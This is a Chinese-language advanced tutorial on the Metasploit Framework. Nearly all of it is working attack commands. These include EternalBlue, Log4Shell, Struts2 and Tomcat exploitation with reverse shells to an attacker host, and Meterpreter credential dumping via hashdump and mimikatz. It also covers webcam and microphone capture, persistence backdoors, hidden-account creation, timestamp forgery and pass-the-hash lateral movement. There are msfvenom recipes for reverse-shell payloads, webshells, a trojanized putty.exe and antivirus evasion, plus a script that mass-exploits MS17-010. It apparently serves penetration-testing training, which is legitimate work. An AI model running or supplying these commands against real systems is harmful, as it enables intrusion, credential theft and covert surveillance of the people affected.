# Metasploit 渗透测试框架深度使用指南

> 分类：工具指南 | 难度：进阶→精通 | 阅读时间：约60分钟

## 概述

Metasploit Framework（MSF）是世界上使用最广泛的渗透测试平台，由 HD Moore 于 2003 年创建，现由 Rapid7 公司维护。它集成了漏洞扫描、漏洞利用、Payload 生成、后渗透控制等完整攻击链组件，被红蓝双方广泛使用。无论你是红队渗透测试员、蓝队安全研究员，还是漏洞分析工程师，Metasploit 都是绕不开的核心工具。

**核心组件**：
- **msfconsole**：主控台，所有操作的入口
- **msfvenom**：Payload 生成器（取代旧的 msfpayload + msfencode）
- **Meterpreter**：高级内存驻留 Payload
- **Auxiliary modules**：4000+ 辅助模块（扫描、信息收集、Fuzz）
- **Exploit modules**：2000+ 漏洞利用模块
- **Post modules**：500+ 后渗透模块

## 核心知识点

- MSF 的模块体系：exploit、auxiliary、payload、encoder、post、nop、evasion
- msfconsole 交互式控制台操作
- Meterpreter 后渗透控制与权限维持
- msfvenom Payload 生成、编码与免杀基础
- MSF 数据库与工作区管理（PostgreSQL）
- 渗透测试全流程自动化与 resource 脚本
- MSF 与 Nmap、Burp、Nessus 的联动
- 内网横向移动与域渗透

---

## 一、安装与环境配置

### 1.1 各平台安装

```bash
# Kali Linux（预装）
sudo apt update && sudo apt install metasploit-framework -y

# Ubuntu/Debian
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
sudo ./msfinstall

# macOS
brew install metasploit

# Windows
# 下载：https://www.metasploit.com/download
# 注意：会被 Defender 标记，需添加排除项

# Docker
docker pull metasploitframework/metasploit-framework
docker run --rm -it metasploitframework/metasploit-framework ./msfconsole
```

### 1.2 数据库初始化

```bash
# 启动 PostgreSQL（必须，用于存储扫描/渗透结果）
sudo systemctl start postgresql
sudo systemctl enable postgresql

# 初始化 MSF 数据库
sudo msfdb init

# 验证数据库状态
sudo msfdb status
# 期望输出：Database: connected / Web Service: running

# 启动 msfconsole 并验证
msfconsole -q
msf6 > db_status
# 期望输出：[*] Connected to msf. Connection type: postgresql.
```

### 1.3 首次更新

```bash
# 更新漏洞利用和模块数据库
msf6 > msfupdate
# 或命令行方式
sudo apt update && sudo apt install metasploit-framework -y
```

---

## 二、MSF 架构概览

### 2.1 架构层次

```
┌─────────────────────────────────────────────┐
│                msfconsole                    │
│         (用户交互界面 / CLI 控制台)            │
├─────────────────────────────────────────────┤
│  exploits │ auxiliary │ payloads │ encoders │
│  (漏洞利用) │  (辅助)   │  (载荷) │  (编码器) │
├─────────────────────────────────────────────┤
│  post (后渗透) │ nop (空操作) │ evasion (免杀)│
├─────────────────────────────────────────────┤
│         Rex / MSF Core / MSF Base           │
│        (底层库：协议/网络/密码学/编码)         │
├─────────────────────────────────────────────┤
│          PostgreSQL（数据库存储）             │
└─────────────────────────────────────────────┘
```

### 2.2 七大模块类型

| 模块类型 | 路径格式 | 说明 | 数量（约）|
|:---|:---|:---|:---:|
| **exploit** | `exploit/平台/服务/漏洞名` | 漏洞利用代码，获取 Shell | 2000+ |
| **auxiliary** | `auxiliary/类型/名称` | 扫描器、Fuzzer、信息收集 | 1200+ |
| **payload** | `payload/平台/类型` | Shellcode 载荷 | 600+ |
| **encoder** | `encoder/平台/类型` | 编码器，免杀辅助 | 50+ |
| **post** | `post/操作系统/功能` | 后渗透模块 | 500+ |
| **nop** | `nop/平台/类型` | NOP 指令生成器 | 20+ |
| **evasion** | `evasion/类型/名称` | 免杀模块 | 10+ |

### 2.3 常用 Payload 类型

| Payload 类型 | 格式示例 | 说明 | 特征 |
|:---|:---|:---|:---|
| **Staged** | `windows/meterpreter/reverse_tcp` | 分阶段加载（小 Stager → 大 Stage）| 初始载荷小，灵活 |
| **Stageless** | `windows/meterpreter_reverse_tcp` | 一体化载荷（`_` 替代 `/`）| 载荷大但无需二次连接 |
| **Inline** | `windows/shell_reverse_tcp` | 最小化 Shell | 直接反弹 cmd |
| **Bind** | `windows/meterpreter/bind_tcp` | 目标开启监听端口 | 不需出网 |
| **Reverse** | `windows/meterpreter/reverse_tcp` | 目标连接回攻击机 | 最常用 |
| **Reverse HTTPS** | `windows/meterpreter/reverse_https` | 加密通信 | 绕过 IDS/IPS |
| **Reverse All-Ports** | `windows/meterpreter/reverse_tcp_allports` | 尝试所有端口 | 高度可靠的通信 |

---

## 三、msfconsole 基础操作

### 3.1 常用命令速查

| 命令 | 说明 |
|:---|:---|
| `search [keyword]` | 搜索模块 |
| `use [module_path]` | 选择/切换到模块 |
| `back` | 返回上级 |
| `info` | 查看模块详细信息 |
| `show options` | 查看模块参数 |
| `show targets` | 查看模块目标平台 |
| `show payloads` | 查看可用的 Payload |
| `show advanced` | 查看高级参数 |
| `show missing` | 查看未设置的必填参数 |
| `set [option] [value]` | 设置参数 |
| `setg [option] [value]` | 全局设置参数 |
| `unset [option]` | 取消参数 |
| `get [option]` | 查看参数当前值 |
| `run` / `exploit` | 执行模块 |
| `exploit -j` | 后台运行 |
| `sessions -l` | 列出所有会话 |
| `sessions -i [id]` | 切换到指定会话 |
| `jobs -l` | 列出后台任务 |
| `kill [job_id]` | 终止后台任务 |
| `resource [file]` | 执行资源脚本 |
| `load [plugin]` | 加载插件 |
| `version` | 查看版本 |
| `exit` | 退出 |

### 3.2 搜索技巧

```bash
# 按 CVE 搜索
search cve:2021-44228
search cve:2017-0144

# 按关键字搜索
search ms17-010
search eternalblue
search log4j

# 按平台搜索
search platform:windows type:exploit
search platform:linux type:exploit

# 按影响范围搜索
search rank:excellent
search rank:great

# 按端口搜索
search port:445
search port:80

# 组合搜索
search platform:windows type:exploit name:smb
search type:auxiliary scanner portscan
search type:post platform:windows name:hashdump

# 按描述搜索
search description:ransomware
search name:apache
```

---

## 四、标准渗透测试流程

### 4.1 从信息收集到获取 Shell

```bash
# === 第1步：信息收集（使用 Nmap 联动 MSF） ===

# 方式1：MSF 内部调用 Nmap
msf6 > db_nmap -sV -O 192.168.1.100

# 方式2：导入 Nmap XML 结果
nmap -sV -oX scan.xml 192.168.1.100
msf6 > db_import scan.xml

# 查看数据库中的资产
msf6 > hosts           # 主机列表
msf6 > services        # 服务列表
msf6 > vulns           # 漏洞列表
msf6 > loot            # 战利品列表

# === 第2步：漏洞分析 ===

# 根据开放端口搜索相关 exploit
msf6 > services -p 445 -u   # 查看所有开放 445 端口的主机
msf6 > search smb type:exploit

# 使用 auxiliary 做更详细探测
msf6 > use auxiliary/scanner/smb/smb_version
msf6 > set RHOSTS 192.168.1.100
msf6 > run

# === 第3步：漏洞利用 ===

msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > show options
msf6 > set RHOSTS 192.168.1.100
msf6 > set LHOST 10.0.0.5              # 攻击机 IP
msf6 > set LPORT 4444                  # 攻击机监听端口
msf6 > show payloads
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > show advanced                   # 查看高级选项
msf6 > set VERBOSE true
msf6 > check                           # 先检查漏洞是否存在
msf6 > exploit                         # 执行漏洞利用

# === 第4步：后渗透 ===

meterpreter > sysinfo                  # 系统信息
meterpreter > getuid                   # 当前用户权限
meterpreter > getprivs                 # 权限列表
meterpreter > getsystem                # 尝试提权到 SYSTEM
meterpreter > background               # 将会话放入后台

# 在 msfconsole 中继续后渗透
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > run                             # 建议本地提权漏洞
```

### 4.2 Check vs Exploit

```bash
# check：无害验证漏洞是否存在
msf6 > use exploit/multi/http/struts2_code_exec_classloader
msf6 > set RHOSTS 192.168.1.100
msf6 > set TARGETURI /struts2-showcase/
msf6 > check
[*] 192.168.1.100:8080 - The target appears to be vulnerable.

# exploit：真正利用漏洞
msf6 > set payload linux/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.0.0.5
msf6 > exploit
```

### 4.3 管理多个会话

```bash
# 列出所有会话
msf6 > sessions -l

# 交互式操作会话
msf6 > sessions -i 1                  # 切换到会话 1

# 后台退出会话
meterpreter > background
# 或 Ctrl+Z

# 向指定会话执行命令
msf6 > sessions -s checkvm -c "sysinfo"

# 在指定会话中运行模块
msf6 > use post/windows/gather/hashdump
msf6 > set SESSION 1
msf6 > run

# 终止会话
msf6 > sessions -k 1
```

---

## 五、Auxiliary 辅助模块

### 5.1 端口和服务扫描

```bash
# TCP 端口扫描
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 192.168.1.0/24
msf6 > set PORTS 21,22,23,25,53,80,443,445,1433,3306,3389,5432,8080,8443,9090
msf6 > set THREADS 20
msf6 > run

# SYN 端口扫描（更快）
msf6 > use auxiliary/scanner/portscan/syn
msf6 > set RHOSTS 192.168.1.0/24
msf6 > set PORTS 1-1000
msf6 > set THREADS 50
msf6 > set INTERFACE eth0
msf6 > run

# SMB 版本探测
msf6 > use auxiliary/scanner/smb/smb_version
msf6 > set RHOSTS 192.168.1.0/24
msf6 > set THREADS 20
msf6 > run

# HTTP 服务版本探测
msf6 > use auxiliary/scanner/http/http_version
msf6 > set RHOSTS 192.168.1.0/24
msf6 > set RPORT 80
msf6 > run

# FTP 版本探测
msf6 > use auxiliary/scanner/ftp/ftp_version
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run
```

### 5.2 认证测试与弱口令

```bash
# SSH 弱口令
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 > set RHOSTS 192.168.1.100
msf6 > set USERNAME root
msf6 > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 > set THREADS 5
msf6 > set STOP_ON_SUCCESS true
msf6 > run

# FTP 匿名登录检测
msf6 > use auxiliary/scanner/ftp/anonymous
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run

# SMB 空会话
msf6 > use auxiliary/scanner/smb/smb_login
msf6 > set RHOSTS 192.168.1.0/24
msf6 > set SMBUser Administrator
msf6 > set SMBPass password
msf6 > run

# SNMP community string 枚举
msf6 > use auxiliary/scanner/snmp/snmp_login
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run

# MySQL 弱口令
msf6 > use auxiliary/scanner/mysql/mysql_login
msf6 > set RHOSTS 192.168.1.100
msf6 > set USERNAME root
msf6 > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 > run

# MSSQL 弱口令
msf6 > use auxiliary/scanner/mssql/mssql_login
msf6 > set RHOSTS 192.168.1.100
msf6 > set USERNAME sa
msf6 > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 > run
```

### 5.3 Web 应用扫描

```bash
# HTTP 目录扫描
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 > set RHOSTS 192.168.1.100
msf6 > set RPORT 80
msf6 > set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
msf6 > run

# HTTP 文件扫描
msf6 > use auxiliary/scanner/http/files_dir
msf6 > set RHOSTS 192.168.1.100
msf6 > set RPORT 80
msf6 > set VERBOSE true
msf6 > run

# HTTP 404 页面枚举（发现隐藏路径）
msf6 > use auxiliary/scanner/http/brute_dirs
msf6 > set RHOSTS 192.168.1.100
msf6 > run

# Apache Struts2 检测
msf6 > use auxiliary/scanner/http/struts_detect_2
msf6 > set RHOSTS 192.168.1.100
msf6 > run
```

---

## 六、关键漏洞利用实战

### 6.1 EternalBlue（MS17-010）

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.1.100
msf6 > set LHOST 10.0.0.5
msf6 > set payload windows/x64/meterpreter/reverse_tcp

# 对 Windows 7/Server 2008 R2 优先尝试此 Target
msf6 > show targets
msf6 > set target 1           # Windows 7 / Server 2008 R2

msf6 > exploit
```

### 6.2 Log4Shell（CVE-2021-44228）

```bash
msf6 > use auxiliary/scanner/http/log4shell_scanner
msf6 > set RHOSTS 192.168.1.100
msf6 > set SRVHOST 10.0.0.5
msf6 > run

# 如果存在漏洞
msf6 > use exploit/multi/http/log4shell_header_injection
msf6 > set RHOSTS 192.168.1.100
msf6 > set LHOST 10.0.0.5
msf6 > set payload linux/x64/meterpreter/reverse_tcp
msf6 > exploit
```

### 6.3 Apache Struts2

```bash
# S2-045
msf6 > use exploit/multi/http/struts2_content_type_ognl
msf6 > set RHOSTS 192.168.1.100
msf6 > set TARGETURI /struts2-showcase/
msf6 > set payload linux/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.0.0.5
msf6 > exploit

# S2-061
msf6 > use exploit/multi/http/struts2_multi_eval_ognl
msf6 > set RHOSTS 192.168.1.100
msf6 > set TARGETURI /struts2-showcase/
msf6 > exploit
```

### 6.4 Tomcat 部署 War

```bash
# Tomcat Manager 弱口令 → 部署 WAR 后门
msf6 > use auxiliary/scanner/http/tomcat_mgr_login
msf6 > set RHOSTS 192.168.1.100
msf6 > set RPORT 8080
msf6 > run

# 登录成功后
msf6 > use exploit/multi/http/tomcat_mgr_upload
msf6 > set RHOSTS 192.168.1.100
msf6 > set RPORT 8080
msf6 > set HttpUsername tomcat
msf6 > set HttpPassword tomcat
msf6 > set payload java/jsp_shell_reverse_tcp
msf6 > set LHOST 10.0.0.5
msf6 > exploit
```

---

## 七、Meterpreter 后渗透核心

### 7.1 基础命令

```bash
# 系统信息
meterpreter > sysinfo                    # 操作系统/架构等信息
meterpreter > getuid                     # 当前用户
meterpreter > getprivs                   # 权限列表
meterpreter > getsystem                  # 自动提权（尝试多种方式）
meterpreter > getpid                     # 当前进程 PID
meterpreter > ps                         # 进程列表
meterpreter > shell                      # 进入系统 Shell
meterpreter > execute -f cmd.exe -i -H   # 隐藏执行命令

# 进程操作
meterpreter > migrate [PID]              # 迁移进程
meterpreter > migrate -N explorer.exe    # 按进程名迁移
meterpreter > getpid                     # 确认迁移后的 PID
meterpreter > steal_token [PID]          # 窃取进程 Token
meterpreter > rev2self                   # 恢复原始 Token

# 网络操作
meterpreter > ipconfig                   # 网络配置
meterpreter > route                      # 查看当前路由
meterpreter > arp                        # ARP 表
meterpreter > netstat                    # 网络连接
meterpreter > portfwd add -L 0.0.0.0 -l 1080 -r 10.10.0.5 -p 80   # 端口转发
meterpreter > portfwd list               # 列出所有端口转发
meterpreter > portfwd delete -l 1080     # 删除转发

# 摄像头与麦克风
meterpreter > webcam_list                # 列出摄像头
meterpreter > webcam_snap                # 摄像头拍照
meterpreter > webcam_stream              # 摄像头实时流
meterpreter > record_mic -d 10           # 录制10秒音频
meterpreter > webcam_chat                # 开启视频聊天
meterpreter > play                       # 后台播放音频
```

### 7.2 文件系统操作

```bash
# 浏览与搜索
meterpreter > pwd                        # 当前目录
meterpreter > ls                         # 列出文件
meterpreter > cd C:\\Windows\\System32
meterpreter > search -f *.txt            # 搜索文件
meterpreter > search -d C:\\Users -f *.docx  # 指定目录搜索

# 上传与下载
meterpreter > download /etc/shadow ./shadow.txt
meterpreter > download -r /var/www ./www_backup    # 递归下载目录
meterpreter > upload payload.exe C:\\Windows\\Temp\\
meterpreter > upload -r awesome_toolset/ C:\\      # 递归上传目录

# 文件操作
meterpreter > edit /etc/ssh/sshd_config            # 编辑文件
meterpreter > cat /etc/passwd                       # 查看文件
meterpreter > rm /tmp/evil.log                      # 删除文件
meterpreter > mkdir /tmp/.hidden                    # 创建目录
meterpreter > rm -rf /tmp/staging                   # 递归删除
meterpreter > timestomp config.ini -f readme.txt    # 伪造时间戳
meterpreter > timestomp -v config.ini               # 查看时间戳
```

### 7.3 持久化与权限维持

```bash
# Windows 持久化
meterpreter > run persistence -A -L C:\\Windows -X -i 10 -p 4444 -r 10.0.0.5
# -A: 自动创建匹配的服务
# -L: Payload 存放位置
# -X: 系统启动时运行
# -i 10: 每10秒尝试连接

# 注册表后门
meterpreter > run persistence -U -i 15 -p 4444 -r 10.0.0.5
# -U: 用户登录时启动

# 创建计划任务
meterpreter > run scheduleme -m 1 -e /tmp/backdoor.sh

# 添加用户
meterpreter > run getgui -u hacker -p P@ssw0rd123

# RDP 开启
meterpreter > run getgui -e
meterpreter > run post/windows/manage/enable_rdp
```

### 7.4 凭据获取

```bash
# Windows 凭据
meterpreter > hashdump                    # SAM 中的本地哈希
meterpreter > creds_all                   # 所有凭据（需加载 kiwi）
meterpreter > load kiwi                   # 加载 Mimikatz 扩展

# Kiwi (Mimikatz) 命令
meterpreter > kiwi_cmd sekurlsa::logonpasswords      # 从 LSASS 获取明文/哈希
meterpreter > kiwi_cmd lsadump::sam                   # SAM 数据库
meterpreter > kiwi_cmd lsadump::secrets               # LSA Secrets
meterpreter > kiwi_cmd lsadump::cache                 # 缓存凭据
meterpreter > creds_msv                             # MSV 凭据
meterpreter > creds_wdigest                          # WDigest 凭据（可能含明文）
meterpreter > creds_kerberos                         # Kerberos 票据
meterpreter > creds_livessp                          # LiveSSP
meterpreter > creds_ssp                              # SSP

# 导出哈希供离线破解
meterpreter > run post/windows/gather/hashdump
meterpreter > run post/windows/gather/smart_hashdump
```

### 7.5 内网横向移动

```bash
# 添加内网路由
meterpreter > run autoroute -s 10.10.0.0/24
meterpreter > run autoroute -p                # 打印当前路由表

# 使用 SOCKS 代理
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 > set VERSION 4a
msf6 > set SRVPORT 1080
msf6 > run -j

# 配置 proxychains
# /etc/proxychains.conf → socks4 127.0.0.1 1080
# proxychains nmap -sT -Pn 10.10.0.0/24

# 内网端口扫描
meterpreter > run autoroute -s 10.10.0.0/24
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 10.10.0.0/24
msf6 > set PORTS 445,3389,22
msf6 > set THREADS 20
msf6 > run

# PsExec 横向移动
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS 10.10.0.10
msf6 > set SMBUser Administrator
msf6 > set SMBPass aad3b435b51404eeaad3b435b51404ee:hashhere
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST 10.0.0.5
msf6 > exploit

# WMIExec
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS 10.10.0.10
msf6 > set SMBUser Administrator
msf6 > set SMBPass password123
msf6 > set SMBDomain CORP
msf6 > set METHOD WMI
msf6 > exploit
```

---

## 八、msfvenom Payload 生成

### 8.1 基础 Payload 生成

```bash
# 列出所有 Payload
msfvenom -l payloads | grep windows
msfvenom -l payloads | grep linux
msfvenom -l payloads | grep android

# 列出所有格式
msfvenom -l formats

# 列出所有编码器
msfvenom -l encoders

# === 各平台 Payload 生成 ===

# Windows 反弹 Meterpreter（exe）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o payload.exe

# Windows Stageless（一体化）
msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o payload.exe

# Linux 反弹 Meterpreter（elf）
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o payload.elf

# macOS
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f macho -o payload

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -o payload.apk

# PHP Webshell
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f asp -o shell.asp

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f war -o shell.war

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o payload.py

# Powershell（常用，无文件落地）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f psh -o payload.ps1
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f psh-reflection -o payload.ps1

# C Shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f c

# Base64 编码的 Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw | base64
```

### 8.2 编码与免杀基础

```bash
# 单次编码
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 \
         -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
# -e: 选择编码器
# -i: 编码迭代次数

# 多次编码（使用不同编码器组合）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 \
         -e x86/shikata_ga_nai -i 5 | \
msfvenom -e x86/countdown -i 3 -f exe -o payload.exe

# 自定义模板（嵌入合法程序）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 \
         -x putty.exe -k -f exe -o evil_putty.exe
# -x: 使用合法程序作为模板
# -k: 保留原始功能（原程序仍可正常运行）

# 修改 Payload 特征
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 \
         -e x86/shikata_ga_nai -i 10 \
         --platform windows -a x86 \
         -b '\x00\x0a\x0d' \
         -f exe -o payload.exe
# -b: 排除坏字符
# --platform: 目标平台
# -a: 架构

# 减小 Payload 体积
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 \
         -e x86/shikata_ga_nai -i 3 \
         --smallest -f exe -o payload.exe
```

### 8.3 多句柄（Handler）监听

```bash
# msfconsole 中使用 handler 接收连接
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST 0.0.0.0        # 监听所有接口
msf6 > set LPORT 4444
msf6 > set ExitOnSession false  # 会话断开后继续监听
msf6 > set AutoRunScript post/windows/manage/migrate   # 收到会话自动迁移
msf6 > exploit -j               # -j: 后台运行

# 单命令创建 handler
msf6 > handler -H 10.0.0.5 -P 4444 -p windows/meterpreter/reverse_tcp

# 同时监听多端口
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST 0.0.0.0
msf6 > set LPORT 80              # 伪装 HTTP 端口
msf6 > set ReverseListenerBindPort 80
msf6 > exploit -j
```

---

## 九、Resource 脚本与自动化

### 9.1 Resource 脚本基础

```bash
# 创建 resource 脚本：auto_scan.rc
cat > auto_scan.rc << 'EOF'
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 21,22,80,443,445,3306,3389,8080
set THREADS 50
run

use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
set THREADS 50
run

use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
set THREADS 50
run

hosts
services
EOF

# 执行脚本
msf6 > resource auto_scan.rc

# 命令行方式执行
msfconsole -r auto_scan.rc

# 静默执行（-q 不显示 banner，-r 执行脚本）
msfconsole -q -r auto_scan.rc
```

### 9.2 自动化攻击脚本

```bash
# auto_pwn.rc - 半自动内网攻击
cat > auto_pwn.rc << 'EOF'
<ruby>
# Ruby 代码块
run_single("use auxiliary/scanner/smb/smb_ms17_010")
run_single("set RHOSTS file:/tmp/alive_hosts.txt")
run_single("set THREADS 50")
run_single("run")

# 遍历数据库中的漏洞主机
framework.db.hosts.each do |host|
  host.vulns.each do |vuln|
    if vuln.name == "MS17-010"
      print_status("Vulnerable host: #{host.address}")
      run_single("use exploit/windows/smb/ms17_010_eternalblue")
      run_single("set RHOSTS #{host.address}")
      run_single("set LHOST 10.0.0.5")
      run_single("set payload windows/x64/meterpreter/reverse_tcp")
      run_single("exploit -j")
    end
  end
end
</ruby>
EOF
```

---

## 十、实战场景全流程

### 场景一：外网 Web 应用渗透

```bash
# 1. 扫描 Web 服务
db_nmap -sV -p 80,443,8080,8443 --script=http-enum 目标IP

# 2. 检查 Web 框架漏洞
use auxiliary/scanner/http/struts_detect_2
set RHOSTS 目标IP
run

use auxiliary/scanner/http/log4shell_scanner
set RHOSTS 目标IP
run

# 3. 检查 Web 目录
use auxiliary/scanner/http/dir_scanner
set RHOSTS 目标IP
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

# 4. 漏洞利用
use exploit/multi/http/struts2_code_exec_classloader
set RHOSTS 目标IP
set TARGETURI /showcase/
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 攻击IP
exploit

# 5. 后渗透
meterpreter > shell
$ whoami && id && uname -a
$ cat /etc/passwd
$ find / -name "*.conf" -type f 2>/dev/null
meterpreter > download /var/www/html/config.php
```

### 场景二：内网域渗透

```bash
# 1. 获得初始立足点
meterpreter > sysinfo
meterpreter > getuid

# 2. 提权
meterpreter > getsystem
meterpreter > run post/multi/recon/local_exploit_suggester

# 3. 提取凭据
meterpreter > load kiwi
meterpreter > kiwi_cmd sekurlsa::logonpasswords
meterpreter > hashdump

# 4. 内网发现
meterpreter > run autoroute -s 10.0.0.0/8
meterpreter > run post/windows/gather/arp_scanner RHOSTS=10.10.0.0/24

# 5. 横向移动
meterpreter > background
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS 10.10.0.10
msf6 > set SMBUser CORP\\Administrator
msf6 > set SMBPass <LM:NTLM_HASH>
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > exploit
```

---

## 十一、与外部工具联动

### 11.1 Nmap → MSF

```bash
# 导入 Nmap 结果到 MSF 数据库
nmap -sV -sC -oX scan.xml 192.168.1.0/24
msf6 > db_import scan.xml
msf6 > hosts
msf6 > services
# 利用数据库自动搜索匹配的漏洞利用
msf6 > vulns
```

### 11.2 Nessus → MSF

```bash
# 从 Nessus 导出 .nessus 文件
# Nessus → Scans → Export → Nessus format
msf6 > db_import scan_results.nessus
msf6 > vulns                           # 查看 Nessus 发现的漏洞
msf6 > vulns -p                        # 以 CVE 引用
```

### 11.3 MSF + Proxychains 深度内网渗透

```bash
# 1. 在 Meterpreter 中添加内网路由
meterpreter > run autoroute -s 172.16.0.0/12
meterpreter > run autoroute -p

# 2. 启动 SOCKS 代理
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 > set VERSION 5
msf6 > set SRVPORT 1080
msf6 > run -j

# 3. 配置 proxychains
# vim /etc/proxychains.conf
# socks5 127.0.0.1 1080

# 4. 通过代理扫描内网
proxychains nmap -sT -Pn -p 445,3389,22,80 172.16.1.0/24
proxychains crackmapexec smb 172.16.1.0/24 -u Administrator -H <hash>
```

---

## 十二、常见问题与排错

| 问题 | 可能原因 | 解决方案 |
|:---|:---|:---|
| `db_status` 未连接 | PostgreSQL 未启动 | `sudo systemctl start postgresql` |
| exploit 失败 | 目标版本不匹配 | `show targets` 选择正确目标 |
| reverse_tcp 超时 | 防火墙/NAT 阻止 | 尝试 `reverse_https` 或 `bind_tcp` |
| Payload 被杀 | AV/EDR 检测 | 使用编码器 + 自定义模板 + 免杀技术 |
| 编码后 Payload 仍被杀 | 静态特征被识别 | 使用 Veil-Evasion 或自写 Loader |
| migrate 失败 | 目标进程架构不匹配 | 确认 Payload 架构与目标进程一致 |
| Session 频繁断开 | 网络不稳定 / AV 阻断 | 使用 `reverse_https` + 增加心跳间隔 |

---

## 十三、练习与自测

1. 搭建 Metasploitable 2/3 靶机，完成完整的渗透测试流程（信息收集→漏洞利用→后渗透）
2. 使用 msfvenom 生成不同平台的 Payload，对比 Staged/Stageless 的区别
3. 编写一个 .rc 脚本，自动完成对 192.168.1.0/24 的信息收集和漏洞验证
4. 用 Meterpreter 完成一次完整的 Windows 域内横向移动
5. 使用 msfvenom 生成一个免杀 Payload，通过 VirusTotal 验证检测率

## 十四、速查卡

```
启动:             msfconsole -q
搜索:             search [keyword]
使用模块:         use [module]
查看参数:         show options
设置目标:         set RHOSTS IP
设置攻击机:       set LHOST IP
设置端口:         set LPORT 4444
选择 Payload:     set payload [path]
执行:             run / exploit
后台运行:         exploit -j
会话列表:         sessions -l
进入会话:         sessions -i [id]
后台会话:         background
数据库扫描:       db_nmap -sV IP
导入扫描:         db_import scan.xml

msfvenom 快速:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell
msfvenom -l payloads | grep linux
```

---

> 📖 本文为"网安百宝箱"课程配套读物。
> 参考：Metasploit 官方文档 https://docs.metasploit.com/ | Offensive Security Metasploit Unleashed
> 更新于 2026-06-18
